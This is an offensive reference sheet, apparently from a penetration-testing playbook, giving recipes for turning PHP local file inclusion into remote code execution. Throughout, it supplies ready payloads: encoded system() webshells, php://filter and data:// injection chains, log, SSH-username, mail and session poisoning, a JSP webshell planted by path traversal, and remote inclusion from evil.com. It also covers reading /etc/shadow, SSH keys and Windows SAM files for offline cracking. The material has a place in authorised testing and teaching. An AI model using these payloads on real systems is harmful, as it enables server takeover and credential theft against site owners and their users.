# PHP wrapper chains + LFI-to-RCE escalation recipes — Open WHEN: an LFI is confirmed against a PHP target (php include/require sink, or a file read you suspect runs through `include`/`file_get_contents`) and you want to read source or escalate to command execution

## php://filter — read source & transform without a writable file

```php
# base64 the source so PHP doesn't execute it on the way out
php://filter/convert.base64-encode/resource=index.php

# string filters: chain with "|" OR with "/" (same effect)
php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd
php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd

# strip HTML tags off mixed content (older PHP only)
php://filter/string.strip_tags/resource=data://text/plain,<b>x</b><?php code; ?>

# re-encode to dodge byte-level content filters
php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololo
php://filter/convert.quoted-printable-encode/resource=...

# compress big files before exfil
php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd
```

`php://filter` is case-insensitive (`PhP://filter` works). Also read open FDs:

```php
php://fd/3          # walk descriptors the process holds open
```

## Extension-check bypass via base64 filter

PHP's base64 decoder ignores non-base64 bytes, so a trailing `.php` the app appends gets swallowed. Encode `<?php system($_GET['cmd']);echo 'done'; ?>` and append `+.php` (or `.php`):

```
?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php
```

## php://filter chain — RCE with no file at all

`convert.iconv.*` filters can generate arbitrary bytes, so a long iconv chain emits valid PHP that `include` then runs. Generate the chain (no upload needed):

```bash
# loknop / synacktiv generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]);?>'
# paste the emitted php://filter/... string into the vulnerable param
```

## php://filter as a blind-read oracle (no output echoed back)

When the include opens the file but never prints it, leak it char-by-char via error-based oracle: `UCS-4LE` inflates the string into an out-of-memory error when the guessed leading char is right; `dechunk` deletes the head unless it's a hex char; `convert.iconv.UNICODE.CP930` shifts a letter forward (a→b→…), and `convert.iconv.UCS-4.UCS-4LE` / `convert.iconv.UTF16.UTF-16BE` rotate later chars into position. Automate:

```bash
git clone https://github.com/synacktiv/php_filter_chains_oracle_exploit
python3 filters_chain_oracle_exploit.py --target http://TARGET/ --file /path --parameter page
```

Vulnerable sinks for this blind technique: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `stream_get_contents`, `fgets`, `fread`, `fpassthru`. Related: **CVE-2024-2961** turns any php-filter file-read into RCE via a 3-byte iconv heap overflow (ambionics write-up).

## data:// and input:// — inline code (need `allow_url_include=On`)

```
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
?page=data://text/plain,<?php phpinfo(); ?>
# bypass an external-URL filter while allow_url_include=On
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwnOyA/Pg==.txt
```

```bash
# php://input runs the POST body as code
curl -XPOST "http://TARGET/index.php?page=php://input" --data "<?php system('id'); ?>"
# expect:// runs a shell command directly (extension must be loaded)
?page=expect://id
```

## zip:// / phar:// — code from an uploaded archive

```bash
echo "<?php system(\$_GET['cmd']); ?>" > payload.php
zip payload.zip payload.php && mv payload.zip shell.jpg
# %23 is the URL-encoded '#'
?page=zip://path/to/shell.jpg%23payload.php
```

`phar://` runs the stub on include, and deserializes its metadata even through read-only sinks (`file_exists`, `filesize`, `md5_file`, …) — build one and point any phar-reachable read at it:

```php
$p = new Phar('test.phar'); $p->startBuffering();
$p->addFromString('test.txt','x');
$p->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$p->stopBuffering();   // php --define phar.readonly=0 create.php
```

## Log poisoning — exact PHP-shell injection points

Put `<?php system($_GET['c']); ?>` into a logged field (User-Agent, or the `Authorization: Basic` header which is base64-decoded into the log), then include the log. Use **single quotes** in the shell — double quotes get HTML-escaped to `&quot;` and break parsing.

```
/var/log/apache2/access.log     /var/log/apache/access.log
/var/log/apache2/error.log      /var/log/nginx/access.log
/var/log/nginx/error.log        /var/log/httpd/error_log
/var/log/vsftpd.log             # inject shell into FTP username field
/var/log/auth.log  /var/log/sshd.log   # SSH: shell goes in the USERNAME
/var/log/mail  /var/mail/<USER>  /var/spool/mail/<USER>   # mail body shell via SMTP to user@localhost
```

**SSH-username vector** — ssh in with the PHP as the username (the failed
login is written verbatim to `auth.log`), then include the log:

```bash
ssh '<?php system($_GET["cmd"]);?>'@TARGET   # connection fails, but the line is logged
# then: ?page=/var/log/auth.log&cmd=id
```

**Mail vector** — `telnet TARGET 25`, send a message whose `subject:` is
`<?php system($_GET["cmd"]); ?>` to a local user, then include
`/var/log/mail` (or `/var/spool/mail/<user>`).

## Credential-file extraction (read, then crack offline)

When the LFI can read privileged files, pull hashes and keys directly —
no RCE needed:

```
# Linux: crack these or reuse the SSH key
/etc/shadow
/home/<user>/.ssh/id_rsa     # enumerate users from /etc/passwd first

# Windows: extract SAM + SYSTEM, then `samdump2 SYSTEM SAM`, crack/pass-the-hash
../../../../../../WINDOWS/repair/sam
../../../../../../WINDOWS/repair/system
```

Read access logs to harvest GET-leaked tokens, then replay:

```http
GET /vuln/asset?name=..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
```

## /proc/self/environ — reflect User-Agent then include

```http
GET /vuln.php?file=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```

## PHP session poisoning

Session files live at `/var/lib/php5/sess_<PHPSESSID>` (or `/var/lib/php/sessions/sess_<id>`). Write code into a field that gets serialized into the session, then include the file:

```
# request 1: store the shell in a session-backed value
login=1&user=<?php system("cat /etc/passwd");?>&pass=x&lang=en_us.php
# request 2: include the session file (PHPSESSID from the cookie)
lang=/../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

## Temp-file / no-upload-field RCE primitives

- **PHP_SESSION_UPLOAD_PROGRESS** — works even with no session and `session.auto_start=Off`: send a multipart POST carrying `PHP_SESSION_UPLOAD_PROGRESS` (value = your PHP), PHP creates `sess_<id>`; race to include it.
- **pearcmd.php** (present in default php docker images) — params without `=` become argv:
  ```
  GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
  ```
- **Nginx temp files** / **phpinfo() + file_uploads=on** / **segmentation-fault temp-file survival** — each lets an uploaded `/tmp/php*` temp file be included before deletion; brute-force the temp name (or hang execution to widen the window).
- **`/proc/$PID/fd/$FD` shell flood** — upload many shells (e.g. 100) so several stay open as file descriptors, then include `/proc/$PID/fd/$FD`; both `$PID` and `$FD` are small integers, brute-force them. Works when uploads land in an unpredictable path but the FDs are still open.
- **Windows FindFirstFile mask** — on Windows, include the uploaded temp file by wildcard instead of guessing its name: `?inc=c:\windows\temp\php<<` (`<<`=`*`, `>`=`?`). Avoids the 65536-name brute force.

## LFI-to-RCE via arbitrary write (traversal in a writer → webshell)

When an upload/ingestion endpoint joins user path data without canonicalizing, break out into a served webroot and drop a shell. The writing service may listen on a non-HTTP port (e.g. a JMF/XML listener on TCP 4004) while a different port serves the payload:

```
Apache/PHP   → /var/www/html/shell.php
Tomcat/Jetty → <tomcat>/webapps/ROOT/shell.jsp
IIS          → C:\inetpub\wwwroot\shell.aspx
```

```xml
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data><![CDATA[<%@ page import="java.io.*" %><%
  String c=request.getParameter("cmd");
  if(c!=null){Process p=Runtime.getRuntime().exec(c);
  try(var i=p.getInputStream();var o=response.getOutputStream()){i.transferTo(o);}}%>]]></Data>
```

## RFI when allow_url_include is off (Windows SMB)

```
?page=\\10.0.0.1\share\shell.php      # host an open SMB share with shell.php
?page=http:%252f%252fevil.com%252fshell.txt   # double-encoded to dodge a scheme filter
```

## assert() injection (sink is `assert("...$file...")`)

```
' and die(highlight_file('/etc/passwd')) or '
' and die(system("id")) or '
```
URL-encode before sending.
